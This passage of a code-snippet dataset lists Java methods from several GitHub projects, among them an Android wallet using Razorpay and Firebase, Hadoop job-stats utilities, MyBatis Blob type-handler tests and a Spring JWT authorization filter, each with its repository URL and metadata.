}", "url": "https://raw.githubusercontent.com/justneon33/Sketchcode/master/app/src/main/java/com/sketch/code/two/api/item/Project.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31399, "method_name": "getProjectCategory", "class_name": "Project", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getProjectCategory() {\n        return projectCategory;\n    }", "url": "https://raw.githubusercontent.com/justneon33/Sketchcode/master/app/src/main/java/com/sketch/code/two/api/item/Project.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31400, "method_name": "getProjectIcon", "class_name": "Project", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getProjectIcon() {\n        return projectIcon;\n    }", "url": "https://raw.githubusercontent.com/justneon33/Sketchcode/master/app/src/main/java/com/sketch/code/two/api/item/Project.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31401, "method_name": "getProjectAbout", "class_name": "Project", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getProjectAbout() {\n        return projectAbout;\n    }", "url": "https://raw.githubusercontent.com/justneon33/Sketchcode/master/app/src/main/java/com/sketch/code/two/api/item/Project.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31402, "method_name": "setProjectAbout", "class_name": "Project", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setProjectAbout(String projectAbout) {\n        this.projectAbout = projectAbout;\n    }", "url": "https://raw.githubusercontent.com/justneon33/Sketchcode/master/app/src/main/java/com/sketch/code/two/api/item/Project.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31403, "method_name": "getProjectName", "class_name": "Project", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getProjectName() {\n        return projectName;\n    }", "url": "https://raw.githubusercontent.com/justneon33/Sketchcode/master/app/src/main/java/com/sketch/code/two/api/item/Project.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31404, "method_name": "setProjectScreenshots", "class_name": "Project", "params": ["ArrayList<Integer>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setProjectScreenshots(ArrayList<Integer> projectScreenshots) {\n        this.projectScreenshots = projectScreenshots;\n    }", "url": "https://raw.githubusercontent.com/justneon33/Sketchcode/master/app/src/main/java/com/sketch/code/two/api/item/Project.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31405, "method_name": "setProjectCategory", "class_name": "Project", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setProjectCategory(int projectCategory) {\n        this.projectCategory = projectCategory;\n    }", "url": "https://raw.githubusercontent.com/justneon33/Sketchcode/master/app/src/main/java/com/sketch/code/two/api/item/Project.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31406, "method_name": "setProject", "class_name": "Project", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setProject(int project) {\n        this.project = project;\n    }", "url": "https://raw.githubusercontent.com/justneon33/Sketchcode/master/app/src/main/java/com/sketch/code/two/api/item/Project.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31407, "method_name": "setProjectIcon", "class_name": "Project", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setProjectIcon(int projectIcon) {\n        this.projectIcon = projectIcon;\n    }", "url": "https://raw.githubusercontent.com/justneon33/Sketchcode/master/app/src/main/java/com/sketch/code/two/api/item/Project.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31408, "method_name": "setProjectName", "class_name": "Project", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setProjectName(String projectName) {\n        this.projectName = projectName;\n    }", "url": "https://raw.githubusercontent.com/justneon33/Sketchcode/master/app/src/main/java/com/sketch/code/two/api/item/Project.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31409, "method_name": "getJobConf", "class_name": "StatsUtils", "params": ["RunningJob"], "throws": null, "modifiers": ["public", "static"], "return_type": "Properties", "snippet": "  public static Properties getJobConf(RunningJob runningJob) {\n    try {\n      Path path = new Path(runningJob.getJobFile());\n      Configuration conf = new Configuration(false);\n      FileSystem fs = FileSystem.get(new Configuration());\n      InputStream in = fs.open(path);\n      conf.addResource(in);\n      return getJobConf(conf);\n    } catch (FileNotFoundException e) {\n      logger.warn(\"Job conf not found.\");\n    } catch (IOException e) {\n      logger.warn(\"Error while retrieving job conf: \" + e.getMessage());\n    }\n    return null;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-jobtype/src/main/java/com/webank/wedatasphere/schedulis/jobtype/StatsUtils.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31410, "method_name": "getJobConf", "class_name": "StatsUtils", "params": ["Configuration"], "throws": null, "modifiers": ["public", "static"], "return_type": "Properties", "snippet": "  public static Properties getJobConf(Configuration conf) {\n    if (conf == null) {\n      return null;\n    }\n\n    Properties jobConfProperties = null;\n    try {\n      jobConfProperties = new Properties();\n      for (Map.Entry<String, String> entry : conf) {\n        if (entry.getKey().equals(\"pig.mapPlan\")\n            || entry.getKey().equals(\"pig.reducePlan\")) {\n          jobConfProperties.setProperty(entry.getKey(), ObjectSerializer\n              .deserialize(entry.getValue()).toString());\n        } else if (JOB_CONF_KEYS.contains(entry.getKey())) {\n          jobConfProperties.setProperty(entry.getKey(), entry.getValue());\n        }\n      }\n    } catch (IOException e) {\n      logger.warn(\"Error while reading job conf: \" + e.getMessage());\n    }\n    return jobConfProperties;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-jobtype/src/main/java/com/webank/wedatasphere/schedulis/jobtype/StatsUtils.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31411, "method_name": "propertiesToJson", "class_name": "StatsUtils", "params": ["Properties"], "throws": null, "modifiers": ["public", "static"], "return_type": "Object", "snippet": "  public static Object propertiesToJson(Properties properties) {\n    Map<String, String> jsonObj = new HashMap<String, String>();\n    if (properties != null) {\n      Set<String> keys = properties.stringPropertyNames();\n      for (String key : keys) {\n        jsonObj.put(key, properties.getProperty(key));\n      }\n    }\n    return jsonObj;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-jobtype/src/main/java/com/webank/wedatasphere/schedulis/jobtype/StatsUtils.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31412, "method_name": "propertiesFromJson", "class_name": "StatsUtils", "params": ["Object"], "throws": null, "modifiers": ["public", "static"], "return_type": "Properties", "snippet": "  public static Properties propertiesFromJson(Object obj) {\n    @SuppressWarnings(\"unchecked\")\n    Map<String, String> jsonObj = (HashMap<String, String>) obj;\n\n    Properties properties = new Properties();\n    for (Map.Entry<String, String> entry : jsonObj.entrySet()) {\n      properties.setProperty(entry.getKey(), entry.getValue());\n    }\n    return properties;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-jobtype/src/main/java/com/webank/wedatasphere/schedulis/jobtype/StatsUtils.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31413, "method_name": "countersToJson", "class_name": "StatsUtils", "params": ["Counters"], "throws": null, "modifiers": ["public", "static"], "return_type": "Object", "snippet": "  public static Object countersToJson(Counters counters) {\n    Map<String, Object> jsonObj = new HashMap<String, Object>();\n\n    if (counters == null) {\n      return jsonObj;\n    }\n\n    Collection<String> counterGroups = counters.getGroupNames();\n    for (String groupName : counterGroups) {\n      Map<String, String> counterStats = new HashMap<String, String>();\n      Group group = counters.getGroup(groupName);\n      Iterator<Counters.Counter> it = group.iterator();\n      while (it.hasNext()) {\n        Counter counter = it.next();\n        counterStats.put(counter.getDisplayName(),\n            String.valueOf(counter.getCounter()));\n      }\n      jsonObj.put(groupName, counterStats);\n    }\n    return jsonObj;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-jobtype/src/main/java/com/webank/wedatasphere/schedulis/jobtype/StatsUtils.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31414, "method_name": "onCreate", "class_name": "AddBalance", "params": ["Bundle"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_add_banlance);\n        loadUI();\n        firebaseId = \"#paone\"; //TODO to be replaced by firebase id of the user obtained after firebase authentication\n\n        FirebaseFirestore db = FirebaseFirestore.getInstance();\n        DocumentReference docRef = db.collection(\"user_balance\").document(firebaseId);\n        docRef.addSnapshotListener(new EventListener<DocumentSnapshot>() {\n            @Override\n            public void onEvent(@Nullable DocumentSnapshot documentSnapshot, @Nullable FirebaseFirestoreException e) {\n                if (e != null) {\n                    Log.e(\"firebase\", \"document doesn't exist\");\n                    return;\n                }\n                if(documentSnapshot.exists())\n                    currentAmount = (long) documentSnapshot.get(\"userBalance\");\n                    Log.e(\"amount\",\"\"+currentAmount);\n                userBalanceTextView.setText(\"\\u20B9 \" + currentAmount);\n            }\n        });\n\n\n        addMoney.setOnClickListener(new View.OnClickListener() {\n            @Override\n            public void onClick(View v) {\n                addAmountDialog.setVisibility(View.VISIBLE);\n            }\n        });\n\n        proceed.setOnClickListener(new View.OnClickListener() {\n            @Override\n            public void onClick(View v) {\n                if (TextUtils.isEmpty(amountText.getText().toString()))\n                    Toast.makeText(AddBalance.this, \"Please enter valid amount\", Toast.LENGTH_SHORT).show();\n                else {\n                    amount = Integer.parseInt(amountText.getText().toString());\n                    if (amount <= 0)\n                        Toast.makeText(AddBalance.this, \"Please enter valid amount\", Toast.LENGTH_SHORT).show();\n                    else\n                        startPayment(amount);\n                }\n            }\n        });\n    }", "url": "https://raw.githubusercontent.com/pawanharariya/wallet/master/app/src/main/java/com/example/pro/AddBalance.java", "stars": "2", "class_props": {"extends": "AppCompatActivity", "implements": ["PaymentResultListener"], "modifiers": ["public"]}}, {"id": 31415, "method_name": "startPayment", "class_name": "AddBalance", "params": ["long"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void startPayment(long amountToAdd) {\n        Checkout checkout = new Checkout();\n//        checkout.setKeyID(\"rzp_test_sVrW5vtI3Nd2pZ\\t\");\n        checkout.setImage(R.drawable.pay);\n        final Activity activity = AddBalance.this;\n        try {\n            JSONObject options = new JSONObject();\n            options.put(\"name\", \"Merchant Name\");\n            options.put(\"description\", \"Reference No. #123456\");\n            options.put(\"image\", \"https://s3.amazonaws.com/rzp-mobile/images/rzp.png\");\n            options.put(\"currency\", \"INR\");\n            options.put(\"amount\", amountToAdd + \"00\");\n            checkout.open(activity, options);\n        } catch (Exception e) {\n            Log.e(\"error\", \"Error in starting Razorpay Checkout\", e);\n        }\n    }", "url": "https://raw.githubusercontent.com/pawanharariya/wallet/master/app/src/main/java/com/example/pro/AddBalance.java", "stars": "2", "class_props": {"extends": "AppCompatActivity", "implements": ["PaymentResultListener"], "modifiers": ["public"]}}, {"id": 31416, "method_name": "onPaymentSuccess", "class_name": "AddBalance", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onPaymentSuccess(String s) {\n        addAmountDialog.setVisibility(View.GONE);\n        Log.e(\"Payment Success\", s);\n        Toast.makeText(AddBalance.this, \"Money added to your wallet\", Toast.LENGTH_SHORT).show();\n        Checkout.clearUserData(this);\n        postData(s);\n    }", "url": "https://raw.githubusercontent.com/pawanharariya/wallet/master/app/src/main/java/com/example/pro/AddBalance.java", "stars": "2", "class_props": {"extends": "AppCompatActivity", "implements": ["PaymentResultListener"], "modifiers": ["public"]}}, {"id": 31417, "method_name": "onPaymentError", "class_name": "AddBalance", "params": ["int", "String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onPaymentError(int i, String s) {\n        Log.e(\"payment error\", s);\n        if (i == Checkout.NETWORK_ERROR) {\n            Log.e(\"error payment failed\", \"Checkout.NETWORK_ERROR\");\n            Toast.makeText(this, \"Poor Network, Payment Failed\", Toast.LENGTH_SHORT).show();\n        }\n        if (i == Checkout.INVALID_OPTIONS) {\n            Log.e(\"error payment failed\", \"Checkout.INVALID_OPTIONS\");\n            Toast.makeText(this, \"Payment Failed\", Toast.LENGTH_SHORT).show();\n\n        }\n        if (i == Checkout.PAYMENT_CANCELED) {\n            Log.e(\"error payment failed\", \"Checkout.PAYMENT_CANCELED\");\n            Toast.makeText(this, \"Payment Canceled by user\", Toast.LENGTH_SHORT).show();\n\n        }\n        if (i == Checkout.TLS_ERROR) {\n            Log.e(\"error payment failed\", \"Checkout.TLS_ERROR\");\n            Toast.makeText(this, \"Payment Not supported\", Toast.LENGTH_SHORT).show();\n        }\n    }", "url": "https://raw.githubusercontent.com/pawanharariya/wallet/master/app/src/main/java/com/example/pro/AddBalance.java", "stars": "2", "class_props": {"extends": "AppCompatActivity", "implements": ["PaymentResultListener"], "modifiers": ["public"]}}, {"id": 31418, "method_name": "postData", "class_name": "AddBalance", "params": ["String"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void postData(final String s) {\n        post = new ProgressDialog(this);\n        post.setCancelable(false);\n        post.setMessage(\"Adding amount\");\n        post.show();\n        FirebaseFirestore db = FirebaseFirestore.getInstance();\n        DocumentReference docRef = db.collection(\"user_balance\").document(firebaseId);\n        Map<String, Object> data = new HashMap<>();\n        data.put(\"userBalance\", currentAmount + amount);\n        docRef.set(data)\n                .addOnCompleteListener(new OnCompleteListener<Void>() {\n                    @Override\n                    public void onComplete(@NonNull Task<Void> task) {\n                        postTransaction(s);\n                    }\n                });\n    }", "url": "https://raw.githubusercontent.com/pawanharariya/wallet/master/app/src/main/java/com/example/pro/AddBalance.java", "stars": "2", "class_props": {"extends": "AppCompatActivity", "implements": ["PaymentResultListener"], "modifiers": ["public"]}}, {"id": 31419, "method_name": "backDialog", "class_name": "AddBalance", "params": ["View"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void backDialog(View view) {\n        addAmountDialog.setVisibility(View.GONE);\n    }", "url": "https://raw.githubusercontent.com/pawanharariya/wallet/master/app/src/main/java/com/example/pro/AddBalance.java", "stars": "2", "class_props": {"extends": "AppCompatActivity", "implements": ["PaymentResultListener"], "modifiers": ["public"]}}, {"id": 31420, "method_name": "loadUI", "class_name": "AddBalance", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void loadUI() {\n        addMoney = findViewById(R.id.add_money);\n        amountText = findViewById(R.id.amount);\n        proceed = findViewById(R.id.proceed);\n        addAmountDialog = findViewById(R.id.add_amount_dialog);\n        userBalanceTextView = findViewById(R.id.user_balance);\n    }", "url": "https://raw.githubusercontent.com/pawanharariya/wallet/master/app/src/main/java/com/example/pro/AddBalance.java", "stars": "2", "class_props": {"extends": "AppCompatActivity", "implements": ["PaymentResultListener"], "modifiers": ["public"]}}, {"id": 31421, "method_name": "postTransaction", "class_name": "AddBalance", "params": ["String"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void postTransaction(String s) {\n        FirebaseFirestore db = FirebaseFirestore.getInstance();\n        DocumentReference docRef2 = db.collection(\"transactions\").document();\n        Map<String, Object> data2 = new HashMap<>();\n        data2.put(\"userId\", firebaseId);\n        data2.put(\"amount\", amount);\n        data2.put(\"transactionId\", s);\n        docRef2.set(data2)\n                .addOnCompleteListener(new OnCompleteListener<Void>() {\n                    @Override\n                    public void onComplete(@NonNull Task<Void> task) {\n                        Toast.makeText(AddBalance.this, \"Money added successfully\", Toast.LENGTH_SHORT).show();\n                        post.dismiss();\n                    }\n                });\n    }", "url": "https://raw.githubusercontent.com/pawanharariya/wallet/master/app/src/main/java/com/example/pro/AddBalance.java", "stars": "2", "class_props": {"extends": "AppCompatActivity", "implements": ["PaymentResultListener"], "modifiers": ["public"]}}, {"id": 31422, "method_name": "getName", "class_name": "JadeArticle", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getName() {\n        return name;\n    }", "url": "https://raw.githubusercontent.com/wangIQD/GoF23/master/GOF23/DesignPattern/src/com/wz/behavioral/visitor/JadeArticle.java", "stars": "2", "class_props": {"extends": null, "implements": ["Museum"], "modifiers": ["public"]}}, {"id": 31423, "method_name": "setName", "class_name": "JadeArticle", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setName(String name) {\n        this.name = name;\n    }", "url": "https://raw.githubusercontent.com/wangIQD/GoF23/master/GOF23/DesignPattern/src/com/wz/behavioral/visitor/JadeArticle.java", "stars": "2", "class_props": {"extends": null, "implements": ["Museum"], "modifiers": ["public"]}}, {"id": 31424, "method_name": "accept", "class_name": "JadeArticle", "params": ["Visitor"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void accept(Visitor visitor) {\n        visitor.visit(this);\n    }", "url": "https://raw.githubusercontent.com/wangIQD/GoF23/master/GOF23/DesignPattern/src/com/wz/behavioral/visitor/JadeArticle.java", "stars": "2", "class_props": {"extends": null, "implements": ["Museum"], "modifiers": ["public"]}}, {"id": 31425, "method_name": "main", "class_name": "DelayQueueDemo", "params": ["String"], "throws": ["InterruptedException"], "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void main(String[] args) throws InterruptedException {\n\n        Order Order1 = new Order(\"Order1\", 5, TimeUnit.SECONDS);\n        Order Order2 = new Order(\"Order2\", 10, TimeUnit.SECONDS);\n        Order Order3 = new Order(\"Order3\", 15, TimeUnit.SECONDS);\n\n        DelayQueue<Order> delayQueue = new DelayQueue<>();\n\n        delayQueue.put(Order1);\n        delayQueue.put(Order2);\n        delayQueue.put(Order3);\n\n        System.out.println(\"\u8ba2\u5355\u5ef6\u8fdf\u961f\u5217\u5f00\u59cb\u65f6\u95f4:\" + LocalDateTime.now().format(DateTimeFormatter.ofPattern(\"yyyy-MM-dd HH:mm:ss\")));\n\n        while (delayQueue.size() != 0) {\n\n            /**\n             * \u53d6\u961f\u5217\u5934\u90e8\u5143\u7d20\u662f\u5426\u8fc7\u53bb\n             */\n            Order task = delayQueue.poll();\n            Order task1 = delayQueue.take();\n\n\n            if (task1 != null) {\n                System.out.format(\"\u8ba2\u5355:{%s}\u88ab\u53d6\u6d88, \u53d6\u6d88\u65f6\u95f4:{%s}\\n\", task1.name, LocalDateTime.now().format(DateTimeFormatter.ofPattern(\"yyyy-MM-dd HH:mm:ss\")));\n            }else{\n                System.out.println(\"null\");\n            }\n        }\n    }", "url": "https://raw.githubusercontent.com/chengxy-nds/delayqueue/master/src/main/java/com/chengxy/delayqueue/delayQueue/DelayQueueDemo.java", "stars": "7", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31426, "method_name": "setupSqlSessionFactory", "class_name": "BlobInputStreamTypeHandlerTest", "params": [], "throws": ["Exception"], "modifiers": ["static"], "return_type": "void", "snippet": "  static void setupSqlSessionFactory() throws Exception {\n    DataSource dataSource = BaseDataTest.createUnpooledDataSource(\"org/apache/ibatis/type/jdbc.properties\");\n    TransactionFactory transactionFactory = new JdbcTransactionFactory();\n    Environment environment = new Environment(\"Production\", transactionFactory, dataSource);\n    Configuration configuration = new Configuration(environment);\n    configuration.addMapper(Mapper.class);\n    sqlSessionFactory = new SqlSessionFactoryBuilder().build(configuration);\n\n    BaseDataTest.runScript(sqlSessionFactory.getConfiguration().getEnvironment().getDataSource(),\n            \"org/apache/ibatis/type/BlobInputStreamTypeHandlerTest.sql\");\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/type/BlobInputStreamTypeHandlerTest.java", "stars": "15", "class_props": {"extends": "BaseTypeHandlerTest", "implements": null, "modifiers": []}}, {"id": 31427, "method_name": "shouldSetParameter", "class_name": "BlobInputStreamTypeHandlerTest", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void shouldSetParameter() throws Exception {\n    InputStream in = new ByteArrayInputStream(\"Hello\".getBytes());\n    TYPE_HANDLER.setParameter(ps, 1, in, null);\n    verify(ps).setBlob(1, in);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/type/BlobInputStreamTypeHandlerTest.java", "stars": "15", "class_props": {"extends": "BaseTypeHandlerTest", "implements": null, "modifiers": []}}, {"id": 31428, "method_name": "shouldGetResultFromResultSetByName", "class_name": "BlobInputStreamTypeHandlerTest", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void shouldGetResultFromResultSetByName() throws Exception {\n    InputStream in = new ByteArrayInputStream(\"Hello\".getBytes());\n    when(rs.getBlob(\"column\")).thenReturn(blob);\n    when(blob.getBinaryStream()).thenReturn(in);\n    assertThat(TYPE_HANDLER.getResult(rs, \"column\")).isEqualTo(in);\n\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/type/BlobInputStreamTypeHandlerTest.java", "stars": "15", "class_props": {"extends": "BaseTypeHandlerTest", "implements": null, "modifiers": []}}, {"id": 31429, "method_name": "shouldGetResultNullFromResultSetByName", "class_name": "BlobInputStreamTypeHandlerTest", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void shouldGetResultNullFromResultSetByName() throws Exception {\n    when(rs.getBlob(\"column\")).thenReturn(null);\n    assertThat(TYPE_HANDLER.getResult(rs, \"column\")).isNull();\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/type/BlobInputStreamTypeHandlerTest.java", "stars": "15", "class_props": {"extends": "BaseTypeHandlerTest", "implements": null, "modifiers": []}}, {"id": 31430, "method_name": "shouldGetResultFromResultSetByPosition", "class_name": "BlobInputStreamTypeHandlerTest", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void shouldGetResultFromResultSetByPosition() throws Exception {\n    InputStream in = new ByteArrayInputStream(\"Hello\".getBytes());\n    when(rs.getBlob(1)).thenReturn(blob);\n    when(blob.getBinaryStream()).thenReturn(in);\n    assertThat(TYPE_HANDLER.getResult(rs, 1)).isEqualTo(in);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/type/BlobInputStreamTypeHandlerTest.java", "stars": "15", "class_props": {"extends": "BaseTypeHandlerTest", "implements": null, "modifiers": []}}, {"id": 31431, "method_name": "shouldGetResultNullFromResultSetByPosition", "class_name": "BlobInputStreamTypeHandlerTest", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void shouldGetResultNullFromResultSetByPosition() throws Exception {\n    when(rs.getBlob(1)).thenReturn(null);\n    assertThat(TYPE_HANDLER.getResult(rs, 1)).isNull();\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/type/BlobInputStreamTypeHandlerTest.java", "stars": "15", "class_props": {"extends": "BaseTypeHandlerTest", "implements": null, "modifiers": []}}, {"id": 31432, "method_name": "shouldGetResultFromCallableStatement", "class_name": "BlobInputStreamTypeHandlerTest", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void shouldGetResultFromCallableStatement() throws Exception {\n    InputStream in = new ByteArrayInputStream(\"Hello\".getBytes());\n    when(cs.getBlob(1)).thenReturn(blob);\n    when(blob.getBinaryStream()).thenReturn(in);\n    assertThat(TYPE_HANDLER.getResult(cs, 1)).isEqualTo(in);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/type/BlobInputStreamTypeHandlerTest.java", "stars": "15", "class_props": {"extends": "BaseTypeHandlerTest", "implements": null, "modifiers": []}}, {"id": 31433, "method_name": "shouldGetResultNullFromCallableStatement", "class_name": "BlobInputStreamTypeHandlerTest", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void shouldGetResultNullFromCallableStatement() throws Exception {\n    when(cs.getBlob(1)).thenReturn(null);\n    assertThat(TYPE_HANDLER.getResult(cs, 1)).isNull();\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/type/BlobInputStreamTypeHandlerTest.java", "stars": "15", "class_props": {"extends": "BaseTypeHandlerTest", "implements": null, "modifiers": []}}, {"id": 31434, "method_name": "integrationTest", "class_name": "BlobInputStreamTypeHandlerTest", "params": [], "throws": ["IOException"], "modifiers": [], "return_type": "void", "snippet": "  void integrationTest() throws IOException {\n    try (SqlSession session = sqlSessionFactory.openSession()) {\n      Mapper mapper = session.getMapper(Mapper.class);\n      // insert (InputStream -> Blob)\n      {\n        BlobContent blobContent = new BlobContent();\n        blobContent.setId(1);\n        blobContent.setContent(new ByteArrayInputStream(\"Hello\".getBytes()));\n        mapper.insert(blobContent);\n        session.commit();\n      }\n      // select (Blob -> InputStream)\n      {\n        BlobContent blobContent = mapper.findOne(1);\n        assertThat(new BufferedReader(new InputStreamReader(blobContent.getContent())).readLine()).isEqualTo(\"Hello\");\n      }\n    }\n\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/type/BlobInputStreamTypeHandlerTest.java", "stars": "15", "class_props": {"extends": "BaseTypeHandlerTest", "implements": null, "modifiers": []}}, {"id": 31435, "method_name": "getId", "class_name": "BlobContent", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getId() {\n      return id;\n    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/type/BlobInputStreamTypeHandlerTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["static"]}}, {"id": 31436, "method_name": "setId", "class_name": "BlobContent", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setId(int id) {\n      this.id = id;\n    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/type/BlobInputStreamTypeHandlerTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["static"]}}, {"id": 31437, "method_name": "getContent", "class_name": "BlobContent", "params": [], "throws": null, "modifiers": ["public"], "return_type": "InputStream", "snippet": "    public InputStream getContent() {\n      return content;\n    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/type/BlobInputStreamTypeHandlerTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["static"]}}, {"id": 31438, "method_name": "setContent", "class_name": "BlobContent", "params": ["InputStream"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setContent(InputStream content) {\n      this.content = content;\n    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/type/BlobInputStreamTypeHandlerTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["static"]}}, {"id": 31439, "method_name": "doFilterInternal", "class_name": "JwtAuthorizationFilter", "params": ["HttpServletRequest", "HttpServletResponse", "FilterChain"], "throws": ["IOException", "ServletException"], "modifiers": ["protected"], "return_type": "void", "snippet": "\tprotected void doFilterInternal(HttpServletRequest request, HttpServletResponse response, FilterChain filterChain)\n\t\t\tthrows IOException, ServletException {\n\t\tvar authentication = this.parseToken(request);\n\t\tif (authentication != null) {\n\t\t\tSecurityContextHolder.getContext().setAuthentication(authentication);\n\t\t}\n\t\telse {\n\t\t\tSecurityContextHolder.clearContext();\n\t\t}\n\t\tfilterChain.doFilter(request, response);\n\t}", "url": "https://raw.githubusercontent.com/joshlong/security-jwt-fun/master/jwt-servlet/src/main/java/com/joshlong/jwt/JwtAuthorizationFilter.java", "stars": "4", "class_props": {"extends": "BasicAuthenticationFilter", "implements": null, "modifiers": ["public"]}}, {"id": 31440, "method_name": "parseToken", "class_name": "JwtAuthorizationFilter", "params": ["HttpServletRequest"], "throws": null, "modifiers": ["private"], "return_type": "UsernamePasswordAuthenticationToken", "snippet": "\tprivate UsernamePasswordAuthenticationToken parseToken(HttpServletRequest request) {\n\t\tvar token = request.getHeader(HttpHeaders.AUTHORIZATION);\n\t\tvar bearerPrefix = \"bearer \";\n\t\tif (StringUtils.hasText(token) && token.toLowerCase().startsWith(bearerPrefix)) {\n\t\t\tvar claims = token.substring(bearerPrefix.length());\n\t\t\ttry {\n\t\t\t\tvar claimsJws = Jwts.parser().setSigningKey(jwtSecret.getBytes()).parseClaimsJws(claims);\n\t\t\t\tvar username = claimsJws.getBody().getSubject();\n\t\t\t\tif (StringUtils.isEmpty(username)) {\n\t\t\t\t\treturn null;\n\t\t\t\t}\n\t\t\t\treturn new UsernamePasswordAuthenticationToken(username, null,\n\t\t\t\t\t\tList.of(new SimpleGrantedAuthority(\"USER\")));\n\t\t\t}\n\t\t\tcatch (JwtException exception) {\n\t\t\t\tlog.warn(\"exception : {} failed : {}\", token, exception.getMessage());\n\t\t\t}\n\t\t}\n\t\treturn null;\n\t}", "url": "https://raw.githubusercontent.com/joshlong/security-jwt-fun/master/jwt-servlet/src/main/java/com/joshlong/jwt/JwtAuthorizationFilter.java", "stars": "4", "class_props": {"extends": "BasicAuthenticationFilter", "implements": null, "modifiers": 